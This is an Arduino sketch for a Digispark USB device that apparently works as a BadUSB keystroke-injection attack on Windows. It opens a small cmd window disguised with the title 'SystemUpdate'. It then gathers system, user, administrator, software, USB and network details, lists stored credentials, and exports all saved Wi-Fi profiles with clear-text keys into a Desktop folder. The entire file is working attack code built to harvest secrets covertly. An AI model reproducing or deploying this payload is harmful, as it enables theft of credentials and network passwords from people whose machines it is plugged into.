#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print(F("cmd /k \"mode con: cols=20 lines=1 & color 08 & title SystemUpdate\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);


  DigiKeyboard.print(F("set P=%USERPROFILE%\\Desktop\\Logs"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // --- STEP 2: CREATING THE BASE FILES ---

  DigiKeyboard.print(F("md \"%P%\\Sys\" & md \"%P%\\Net\" & md \"%P%\\Wifi\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  // --- STEP 3: SYSTEM ANALYSIS (Sys) ---

  DigiKeyboard.print(F("wmic logicaldisk get caption,size,freespace > \"%P%\\Sys\\Disk.txt\" & wmic memorychip get capacity,speed > \"%P%\\Sys\\RAM.txt\" & wmic cpu get name > \"%P%\\Sys\\CPU.txt\" & net user > \"%P%\\Sys\\Users.txt\" & net localgroup administrators > \"%P%\\Sys\\Admins.txt\" & reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr \"DisplayName\" > \"%P%\\Sys\\Software.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // OS Info, USB, Creds
  DigiKeyboard.print(F("wmic os get Caption,CSDVersion,OSArchitecture,Version > \"%P%\\Sys\\OS_Info.txt\" & reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s | findstr \"FriendlyName\" > \"%P%\\Sys\\USB.txt\" & cmdkey /list > \"%P%\\Sys\\Creds.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  // --- STEP 4: NETWORK ANALYSIS (Net) ---
  // IP, DNS, ARP, Route, Ports, Hosts
  DigiKeyboard.print(F("ipconfig /all > \"%P%\\Net\\IP.txt\" & ipconfig /displaydns > \"%P%\\Net\\DNS.txt\" & arp -a > \"%P%\\Net\\ARP.txt\" & route print > \"%P%\\Net\\Route.txt\" & netstat -ano > \"%P%\\Net\\Ports.txt\" & type C:\\Windows\\System32\\drivers\\etc\\hosts > \"%P%\\Net\\Hosts.txt\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // --- STEP 5: WIRELESS ANALYSIS (Wifi) ---
  // Show All & Export Loop
  DigiKeyboard.print(F("netsh wlan show all > \"%P%\\Wifi\\Report.txt\" & FOR /F \"skip=9 tokens=*\" %A IN ('NETSH WLAN SHOW PROFILES') DO FOR /F \"tokens=2 delims=:\" %B IN (\"%A\") DO FOR /F \"tokens=*\" %C IN (\"%B\") DO NETSH WLAN EXPORT PROFILE name=\"%C\" folder=\"%P%\\Wifi\" key=clear"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // --- FINAL STEP ---
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Bos
}